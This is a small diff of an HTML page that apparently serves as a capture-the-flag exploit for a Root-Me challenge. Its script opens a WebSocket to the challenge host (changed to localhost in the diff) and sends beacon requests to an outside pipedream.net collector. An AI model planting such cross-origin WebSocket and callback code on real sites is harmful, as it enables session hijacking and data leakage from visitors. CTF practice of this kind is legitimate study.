@@ -9,12 +9,11 @@
 <body>
 <h1>Coucou</h1>
 
-<iframe src="http://ctf30.root-me.org/" width="800" height="600"></iframe>
 
 <script>
     console.log("hello")
     fetch(`https://enucj0ezme2n.x.pipedream.net/?eheh=avantlaco`);
-    const ws = new WebSocket('ws://ctf30.root-me.org/ws');
+    const ws = new WebSocket('ws://localhost/ws');
     fetch(`https://enucj0ezme2n.x.pipedream.net/?eheh=aprèslaco`);
     ws.addEventListener('open', function start(event) {
         ws.send("hello");
